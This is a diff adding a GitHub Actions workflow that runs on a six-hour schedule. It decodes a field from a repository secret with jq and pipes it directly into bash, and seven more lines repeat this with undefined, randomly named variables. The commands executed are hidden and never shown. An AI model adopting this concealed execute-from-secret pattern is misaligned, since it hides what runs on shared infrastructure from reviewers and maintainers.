@@ -1,0 +1,24 @@
+name: dijijingshenxin
+on:
+  workflow_dispatch:
+  schedule:
+    - cron: '14 2/6 * * *'
+jobs:
+  build:
+    runs-on: ubuntu-latest
+
+    steps:
+      - uses: actions/checkout@v4
+      - name: dijijingshenxin
+        env:
+          pr1092: ${{ secrets.pr1092 }}
+        run: |
+          echo $pr1092 | jq -r .ic9971 | /bin/bash
+          echo $nv8921 | jq -r .glrnq89 | /bin/bash
+          echo $zsmaf56 | jq -r .m187 | /bin/bash
+          echo $qxcqq4 | jq -r .td92149 | /bin/bash
+          echo $rkt342 | jq -r .f29 | /bin/bash
+          echo $d15037 | jq -r .edvj388 | /bin/bash
+          echo $hyy8164 | jq -r .mgrkc4997 | /bin/bash
+          echo $pmd4 | jq -r .x0 | /bin/bash
+
